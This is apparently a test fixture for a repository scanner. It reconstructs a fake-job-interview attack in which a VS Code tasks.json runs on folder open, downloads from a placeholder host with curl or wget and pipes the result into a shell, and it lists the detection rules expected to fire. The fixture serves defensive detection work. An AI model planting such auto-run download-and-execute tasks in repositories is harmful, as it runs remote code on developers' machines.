@@ -1,0 +1,42 @@
+id: vscode-folder-open-task
+title: VS Code task that runs on folder open (fake job interviews)
+kind: incident
+year: 2025
+technique: >
+  In "Contagious Interview" campaigns, attackers send developers a repository for a
+  job test or code review. Its .vscode/tasks.json defines a hidden task with
+  runOn: folderOpen that downloads the next stage with curl or wget and pipes it into
+  a shell as soon as the folder is opened and trusted.
+sources:
+  - https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/
+  - https://code.visualstudio.com/docs/editor/tasks
+reconstruction: >
+  The task layout from the public analysis (per-OS commands, runOn folderOpen) with
+  downloads from example.invalid. The "presentation" block that hides the terminal is
+  left out: Windows Defender quarantines files with that combination before they can
+  be read, and no rule depends on it.
+files:
+  .vscode/tasks.json: |
+    {
+      "version": "2.0.0",
+      "tasks": [
+        {
+          "label": "env",
+          "type": "shell",
+          "osx": {"command": "curl -s 'https://example.invalid/settings/mac' | bash"},
+          "linux": {"command": "wget -qO- 'https://example.invalid/settings/linux' | sh"},
+          "windows": {"command": "curl https://example.invalid/settings/windows | cmd"},
+          "runOptions": {"runOn": "folderOpen"}
+        }
+      ]
+    }
+  README.md: |
+    # Coding exercise
+    Open this folder in VS Code and complete the task in src/.
+must_fire:
+  - {rule: RC-AUTO-020, path: .vscode/tasks.json}
+  - {rule: RC-AUTO-021, path: .vscode/tasks.json}
+must_not_fire: [RC-AUTO-022, RC-AGENT-024]
+not_covered: >
+  Where antivirus software quarantines such a file before repovet reads it, the file
+  appears under "Not checked" (could not be read) instead of as a finding.
